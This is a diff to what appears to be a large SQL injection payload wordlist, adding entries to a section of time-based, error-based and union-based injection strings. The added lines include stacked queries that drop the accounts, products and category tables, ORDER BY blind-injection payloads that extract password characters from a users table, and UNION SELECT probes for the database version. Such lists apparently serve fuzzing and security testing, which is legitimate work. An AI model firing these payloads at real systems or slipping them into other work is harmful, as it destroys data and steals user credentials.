@@ -10850,4 +10850,19 @@ exp(~(select * from (select concat(0x7171706a71,(select (elt(1049=1049,1))),0x71
 1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'swke'='swke
 1 rlike (select * from (select(sleep(5)))sgvo)-- saxs
 -7511)) as xqzf where 9939=9939 union all select 9939,9939,9939,9939,9939,9939,9939--
-drop table accounts;
+'; drop table accounts;
+'; drop table products;
+; drop table category;
+order by 1 / (case when 1=1 then 1 else 0 end) -- 
+order by 1 / (case when ((select substring(password, 1, 1) from users) = 'h') then 1 else 0 end) #  
+order by 1 / (case when ((select substring(password, 1, 1) from users) = char(54)) then 1 else 0 end) # 
+order by 1 / (case when ((select substring(password, 1, 3) from users) = char(67)||char(20)||char(90)) then 1 else 0 end) # 
+order by 1 / (case when ((select substring(password, 1, 2) from users) = ('g' 'q')) then 1 else 0 end) -- 
+union select @@version; -- 
+union select @@version,null; -- 
+union select @@version,null,null; -- 
+union select @@version,null,null,null; -- 
+union select version(); # 
+union select version(),null; # 
+union select version(),null,null; # 
+union select version(),null,null,null; # 
